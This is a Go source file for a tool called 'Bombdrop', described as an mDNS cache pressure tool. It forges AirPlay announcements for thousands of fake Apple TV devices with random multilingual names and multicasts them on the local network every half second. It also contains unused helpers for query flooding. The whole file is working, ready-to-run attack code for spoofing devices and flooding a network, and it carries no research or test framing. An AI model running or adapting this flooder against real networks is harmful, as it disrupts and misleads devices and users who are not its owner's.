package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/miekg/dns"
)

var (
	// Arrays for generating random device names
	locations = []string{
		// English
		"Living Room", "Kitchen", "Bedroom", "Office", "Basement",
		// Spanish
		"Sala de Estar", "Cocina", "Dormitorio", "Oficina", "Sótano",
		// French
		"Salon", "Cuisine", "Chambre", "Bureau", "Sous-sol",
		// German
		"Wohnzimmer", "Küche", "Schlafzimmer", "Büro", "Keller",
		// Italian
		"Soggiorno", "Cucina", "Camera da Letto", "Ufficio", "Cantina",
		// Japanese
		"リビング", "キッチン", "寝室", "オフィス", "地下室",
		// Chinese
		"客厅", "厨房", "卧室", "办公室", "地下室",
		// Korean
		"거실", "주방", "침실", "사무실", "지하실",
		// Russian
		"Гостиная", "Кухня", "Спальня", "Офис", "Подвал",
		// Arabic
		"غرفة المعيشة", "مطبخ", "غرف النوم", "مكتب", "قبو",
		// Emojis with locations
		"🏠 Home", "🎮 Game Room", "🎥 Theater", "📚 Library", "🏋️ Gym",
	}
	adjectives = []string{
		// English
		"Main", "Upper", "Lower", "Smart", "Cozy",
		// Spanish
		"Principal", "Superior", "Inferior", "Inteligente", "Acogedor",
		// French
		"Principal", "Supérieur", "Inférieur", "Intelligent", "Confortable",
		// German
		"Haupt", "Ober", "Unter", "Smart", "Gemütlich",
		// Italian
		"Principale", "Superiore", "Inferiore", "Intelligente", "Accogliente",
		// Japanese
		"メイン", "アッパー", "ロワー", "スマート", "居心地の良い",
		// Chinese
		"主要", "上层", "下层", "智能", "舒适",
		// Korean
		"메인", "상층", "하층", "스마트", "아늑한",
		// Russian
		"Главный", "Верхний", "Нижний", "Умный", "Уютный",
		// Arabic
		"رئيسي", "علوي", "سفلي", "ذكي", "مريح",
		// Emojis with adjectives
		"✨ Fancy", "🌟 Premium", "💫 Deluxe", "🎯 Pro", "⭐ Elite",
	}
	deviceTypes = []string{
		// English
		"TV", "Display", "Screen", "Hub", "Station",
		// Spanish
		"Televisor", "Pantalla", "Monitor", "Centro", "Estación",
		// French
		"Télé", "Écran", "Moniteur", "Centre", "Station",
		// German
		"Fernseher", "Bildschirm", "Monitor", "Zentrale", "Station",
		// Italian
		"TV", "Display", "Schermo", "Centro", "Stazione",
		// Japanese
		"テレビ", "ディスプレイ", "スクリーン", "ハブ", "ステーション",
		// Chinese
		"电视", "显示器", "屏幕", "中心", "站",
		// Korean
		"텔레비전", "디스플레이", "스크린", "허브", "스테이션",
		// Russian
		"Телевизор", "Дисплей", "Экран", "Хаб", "Станция",
		// Arabic
		"تلفاز", "شاشة", "عرض", "مركز", "محطة",
		// Emojis with device types
		"📺 TV", "🖥️ Display", "📱 Screen", "🎮 Console", "🎵 Audio",
	}
)

func generateDeviceName() string {
	// Create random device names using the arrays
	adj := adjectives[rand.Intn(len(adjectives))]
	loc := locations[rand.Intn(len(locations))]
	dev := deviceTypes[rand.Intn(len(deviceTypes))]

	// Sometimes add a random number suffix for extra variety
	if rand.Intn(2) == 1 {
		return fmt.Sprintf("%s %s %s %d", adj, loc, dev, rand.Intn(999))
	}
	return fmt.Sprintf("%s %s %s", adj, loc, dev)
}

func generateDeviceID() string {
	bytes := make([]byte, 6)
	rand.Read(bytes)
	return fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X",
		bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5])
}

func sanitizeDeviceName(name string) (string, string) {
	// Keep original name for display
	displayName := name

	// Simple DNS-safe conversion:
	// 1. Replace spaces with hyphens
	// 2. Remove any characters that aren't alphanumeric, hyphens, or dots
	// 3. Limit length to 63 characters (DNS label limit)
	dnsName := strings.Map(func(r rune) rune {
		switch {
		case r >= 'a' && r <= 'z':
			return r
		case r >= 'A' && r <= 'Z':
			return r
		case r >= '0' && r <= '9':
			return r
		case r == ' ':
			return '-'
		case r == '.':
			return r
		case r == '-':
			return r
		default:
			return '-'
		}
	}, name)

	// Ensure no double hyphens
	for strings.Contains(dnsName, "--") {
		dnsName = strings.ReplaceAll(dnsName, "--", "-")
	}

	// Trim hyphens from start and end
	dnsName = strings.Trim(dnsName, "-")

	// Ensure we have a valid name
	if len(dnsName) == 0 {
		dnsName = fmt.Sprintf("device-%d", rand.Intn(10000))
	}

	// Truncate if too long
	if len(dnsName) > 63 {
		dnsName = dnsName[:63]
		// Ensure we don't end with a hyphen
		dnsName = strings.TrimRight(dnsName, "-")
	}

	return dnsName, displayName
}

func createAirPlayAnnouncements(name string, deviceID string) []*dns.Msg {
	// Create base AirPlay announcement
	airplayMsg := new(dns.Msg)
	airplayMsg.Response = true
	airplayMsg.Authoritative = true
	airplayMsg.Id = 0

	// AirPlay PTR
	airplayPtr := &dns.PTR{
		Hdr: dns.RR_Header{
			Name:   "_airplay._tcp.local.",
			Rrtype: dns.TypePTR,
			Class:  dns.ClassINET,
			Ttl:    4500,
		},
		Ptr: fmt.Sprintf("%s._airplay._tcp.local.", name),
	}

	// SRV with cache-flush
	srvAirPlay := &dns.SRV{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._airplay._tcp.local.", name),
			Rrtype: dns.TypeSRV,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    4500,
		},
		Priority: 0,
		Weight:   0,
		Port:     7000,
		Target:   fmt.Sprintf("%s.local.", name),
	}

	// Standard AirPlay TXT record
	airplayTxt := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._airplay._tcp.local.", name),
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    4500,
		},
		Txt: []string{
			"features=0x5A7FFFF7",
			fmt.Sprintf("deviceid=%s", deviceID),
			"model=AppleTV3,2",
			"srcvers=220.68",
			"flags=0x4",
			fmt.Sprintf("name=%s", name),
			"pk=b07727d6f6cd6e08b58ede525ec3cdeaa252ad9f683feb212ef8a3922d46baa9",
		},
	}

	airplayMsg.Answer = []dns.RR{airplayPtr, srvAirPlay, airplayTxt}
	return []*dns.Msg{airplayMsg}
}

func createLoadQueries() []*dns.Msg {
	queries := []*dns.Msg{
		// Service Discovery queries
		createQuery("_services._dns-sd._udp.local.", dns.TypePTR),
		createQuery("_airplay._tcp.local.", dns.TypePTR),
		createQuery("_raop._tcp.local.", dns.TypePTR),
		createQuery("_companion-link._tcp.local.", dns.TypePTR),
		createQuery("_sleep-proxy._udp.local.", dns.TypePTR),
		createQuery("_homekit._tcp.local.", dns.TypePTR),
		createQuery("_spotify-connect._tcp.local.", dns.TypePTR),

		// Reverse lookup queries
		createQuery("211.0.168.192.in-addr.arpa.", dns.TypePTR),

		// Instance queries
		createQuery("Living-Room._airplay._tcp.local.", dns.TypeSRV),
		createQuery("Living-Room._airplay._tcp.local.", dns.TypeTXT),
		createQuery("Living-Room.local.", dns.TypeA),
		createQuery("Living-Room.local.", dns.TypeAAAA),

		// Any queries (these are particularly heavy)
		createQuery("_airplay._tcp.local.", dns.TypeANY),
		createQuery("local.", dns.TypeANY),

		// Cache flush queries
		createCacheFlushQuery("_airplay._tcp.local.", dns.TypePTR),
		createCacheFlushQuery("_raop._tcp.local.", dns.TypePTR),

		// Negative queries (non-existent services)
		createQuery("_nonexistent._tcp.local.", dns.TypePTR),
		createQuery("missing-device.local.", dns.TypeA),

		// Large TXT record queries
		createQuery("Living-Room._airplay._tcp.local.", dns.TypeTXT),
	}
	return queries
}

func createQuery(name string, qtype uint16) *dns.Msg {
	m := new(dns.Msg)
	m.SetQuestion(name, qtype)
	m.RecursionDesired = true
	return m
}

func createCacheFlushQuery(name string, qtype uint16) *dns.Msg {
	m := new(dns.Msg)
	m.SetQuestion(name, qtype)
	m.RecursionDesired = true
	// Set cache flush bit
	m.Question[0].Qclass = dns.ClassINET | 0x8000
	return m
}

func handleResponses(conn *net.UDPConn, mdnsAddr *net.UDPAddr) {
	buf := make([]byte, 65535)
	for {
		n, _, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}

		msg := new(dns.Msg)
		if err := msg.Unpack(buf[:n]); err != nil {
			continue
		}

		// Force cache processing by checking all records
		for _, rr := range msg.Answer {
			switch rr.(type) {
			case *dns.PTR:
				// Trigger new SRV+TXT queries for each PTR
				name := rr.(*dns.PTR).Ptr
				queries := []*dns.Msg{
					createQuery(name, dns.TypeSRV),
					createQuery(name, dns.TypeTXT),
				}
				for _, q := range queries {
					queryBytes, _ := q.Pack()
					conn.WriteToUDP(queryBytes, mdnsAddr)
				}
			}
		}
	}
}

func sendQueries(conn *net.UDPConn, mdnsAddr *net.UDPAddr, queries []*dns.Msg, rate int) {
	ticker := time.NewTicker(time.Second / time.Duration(rate))
	defer ticker.Stop()

	for range ticker.C {
		query := queries[rand.Intn(len(queries))]
		queryBytes, err := query.Pack()
		if err != nil {
			continue
		}
		conn.WriteToUDP(queryBytes, mdnsAddr)
	}
}

func generateDevices(count int, debug bool) []*dns.Msg {
	var announcements []*dns.Msg
	for i := 0; i < count; i++ {
		name := generateDeviceName()
		deviceID := generateDeviceID()
		deviceAnnouncements := createAirPlayAnnouncements(name, deviceID)
		announcements = append(announcements, deviceAnnouncements...)
		if debug {
			log.Printf("Generated device %d/%d: %s", i+1, count, name)
		}
	}
	return announcements
}

func main() {
	numDevices := flag.Int("n", 1000, "Number of devices to advertise")
	debug := flag.Bool("debug", false, "Enable debug logging")
	help := flag.Bool("h", false, "Show help")
	interfaceName := flag.String("i", "", "Network interface to use (default: system chosen)")
	broadcastIP := flag.String("b", "224.0.0.251", "Multicast/broadcast IP address")
	flag.Parse()

	// Show help if requested or no arguments provided
	if *help || len(os.Args) == 1 {
		fmt.Println(`
Bombdrop - mDNS Cache Pressure Tool

Usage:
  sudo go run main.go -n 5000 [-debug] [-i eth0] [-b 224.0.0.251]

Options:
  -n <num>    Number of devices to advertise (default: 1000)
  -debug      Enable debug logging
  -i <iface>  Network interface to use (default: system chosen)
  -b <ip>     Multicast/broadcast IP address (default: 224.0.0.251)
  -h          Show this help message

Examples:
  # Basic usage with 5000 devices
  sudo go run main.go -n 5000

  # Specify network interface
  sudo go run main.go -i eth0 -n 1000

  # Use broadcast instead of multicast (useful for some networks)
  sudo go run main.go -b 192.168.1.255 -n 1000

  # Use link-local multicast
  sudo go run main.go -b 224.0.0.251 -n 1000

Notes:
  - For multicast: 224.0.0.251 is the standard mDNS address
  - For broadcast: use your subnet's broadcast (typically x.x.x.255)
  - For /31 networks: there is no broadcast address, use multicast or direct IP
  - Root/admin privileges are usually required for multicast
`)
		return
	}

	// Setup network connection with interface if specified
	var ifi *net.Interface
	var err error

	if *interfaceName != "" {
		ifi, err = net.InterfaceByName(*interfaceName)
		if err != nil {
			log.Fatalf("Error finding interface %s: %v", *interfaceName, err)
		}
		if *debug {
			log.Printf("Using interface: %s", *interfaceName)
		}
	}

	// Parse the broadcast IP
	broadcastIPAddr := net.ParseIP(*broadcastIP)
	if broadcastIPAddr == nil {
		log.Fatalf("Invalid broadcast IP address: %s", *broadcastIP)
	}

	if *debug {
		log.Printf("Using broadcast IP: %s", broadcastIPAddr.String())
	}

	conn, err := net.ListenMulticastUDP("udp4", ifi, &net.UDPAddr{
		IP:   broadcastIPAddr,
		Port: 5353,
	})
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	mdnsAddr := &net.UDPAddr{
		IP:   broadcastIPAddr,
		Port: 5353,
	}

	if *debug {
		log.Printf("Starting device flood: %d devices", *numDevices)
	}

	// Generate initial devices
	currentAnnouncements := generateDevices(*numDevices, *debug)

	// Standard announcement ticker
	announceTicker := time.NewTicker(500 * time.Millisecond)
	defer announceTicker.Stop()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)

	for {
		select {
		case <-announceTicker.C:
			for _, announcement := range currentAnnouncements {
				announcementBytes, err := announcement.Pack()
				if err != nil {
					if *debug {
						log.Printf("Error packing announcement: %v", err)
					}
					continue
				}
				if _, err := conn.WriteToUDP(announcementBytes, mdnsAddr); err != nil {
					if *debug {
						log.Printf("Error sending announcement: %v", err)
					}
				}
			}

		case <-sigChan:
			if *debug {
				log.Println("Shutting down...")
			}
			return
		}
	}
}
